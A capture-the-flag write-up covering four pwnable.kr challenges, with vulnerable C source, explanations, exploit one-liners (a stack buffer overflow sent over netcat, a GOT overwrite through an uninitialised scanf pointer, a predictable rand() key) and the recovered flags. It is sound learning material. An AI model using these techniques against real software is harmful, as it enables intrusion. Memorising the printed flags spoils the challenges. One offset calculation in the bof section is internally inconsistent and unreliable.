@@ -1,0 +1,145 @@
+pwnable.kr 
+
+-----------------------------------------------[fd]------------------------------------------------
+A file descriptor of 0 is stdin, 1 stdout, 2 stderr, anything else are files which are explicitly 
+opened. In C, reading from file descriptor of 0 is same as getting user input (stdin). 
+
+char buf[32];
+int main(int argc, char* argv[], char* envp[]){
+	if(argc<2){
+		printf("pass argv[1] a number\n");
+		return 0;
+	}
+	int fd = atoi( argv[1] ) - 0x1234;
+	int len = 0;
+	len = read(fd, buf, 32);
+	if(!strcmp("LETMEWIN\n", buf)){
+		printf("good job :)\n");
+		setregid(getegid(), getegid());
+		system("/bin/cat flag");
+		exit(0);
+	}
+	printf("learn about Linux file IO\n");
+	return 0;
+}
+
+Program takes in integer cmd line arg. This argv[1] - 0x1234 is the file descriptor to read
+from and store in buffer buf. If buf matches "LETMEWIN", flag is found. 
+
+$ ./fd 4660
+$ LETMEWIN
+
+flag: mommy! I think I know what a file descriptor is!!
+
+-----------------------------------------------[bof]-----------------------------------------------
+Buffer overflow where from overflowme buffer must overflow the key value to 0xcafebabe.
+
+void func(int key){
+	char overflowme[32];
+	printf("overflow me : ");
+	gets(overflowme);       // smash me!
+	if(key == 0xcafebabe){
+		setregid(getegid(), getegid());
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+int main(int argc, char* argv[]){
+	func(0xdeadbeef);
+	return 0;
+}
+
+GDB analysis shows that distance from oveflowme buffer to key is 0x34 bytes (52 bytes).
+This means that input must be 0x2 bytes + 0x14 bytes + \xbe\xba\xfe\xca
+bof binary is running at "nc 0 9000" under bof_pwn privilege. get shell and read flag
+
+Main challenge is making the shell from system call actually stay persistent.
+
+$ (perl -e 'print "\x41"x52 . "\xbe\xba\xfe\xca"';cat) | nc 0 9000
+
+flag: Daddy_I_just_pwned_a_buff3r!
+
+--------------------------------------------[passcode]---------------------------------------------
+After welcome call, the name buffer still remains in memory as previous stack frame. When login()
+is called, it will reuse the same stack space as welcome(). 
+scanf("%d", passcode) is a vulnerability, as it will write to the value that passcode holds not
+actual passcode location
+
+void login(){
+	int passcode1;
+	int passcode2;
+
+	scanf("%d", passcode1);
+	fflush(stdin);
+	scanf("%d", passcode2);
+
+	if(passcode1==123456 && passcode2==13371337){
+		setregid(getegid(), getegid());
+		system("/bin/cat flag");
+	}
+	else{
+		printf("Login Failed!\n");
+		exit(0);
+	}
+}
+
+void welcome(){
+	char name[100];
+	printf("enter you name : ");
+	scanf("%100s", name);
+	printf("Welcome %s!\n", name);
+}
+
+int main(){
+	welcome();
+	login();
+	return 0;
+}
+
+Checking security with checksec shows that RELRO is partial. Also it is not PIE, meaning no ASLR. 
+Means that GOT can be modified. Analysis with gdb show that passcode1 holds default value before 
+initialization from name[96] 
+
+Set name input to: 96 bytes of padding + <addr>
+<addr> can be set to GOT entry fflush. Get GOT addr:
+$ objdump -R passcode
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+0804c014 R_386_JUMP_SLOT   fflush@GLIBC_2.0
+
+(perl -e 'print "\x41"x96 . "\x14\xc0\x04\x08"'; perl -e 'print "134517443"') | ./passcode
+
+---------------------------------------------[random]----------------------------------------------
+#include <stdio.h>
+
+int main(){
+	unsigned int random;
+	random = rand();        // random value!
+
+	unsigned int key=0;
+	scanf("%d", &key);
+
+	if( (key ^ random) == 0xcafebabe ){
+		printf("Good!\n");
+		setregid(getegid(), getegid());
+		system("/bin/cat flag");
+		return 0;
+	}
+
+	printf("Wrong, maybe you should try 2^32 cases.\n");
+	return 0;
+}
+
+rand() is not actually random, it is pseudo-random. Thus value of random variable is deterministic
+Find the value by running a program that gets rand() to unsigned int and print.
+
+1804289383 => 0x6B8B4567
+thus: 0x6B8B4567 ^ x = 0xcafebabe. By definition of ^: 0x6B8B4567 ^ 0xcafebabe = x
+x = 0xa175ffd9 => 2708864985
+
+Because the program expects input in decimal (base 10), x must be converted back from hex to decimal
+otherwise the scanf will not work.
+
+flag: m0mmy_I_can_predict_rand0m_v4lue!
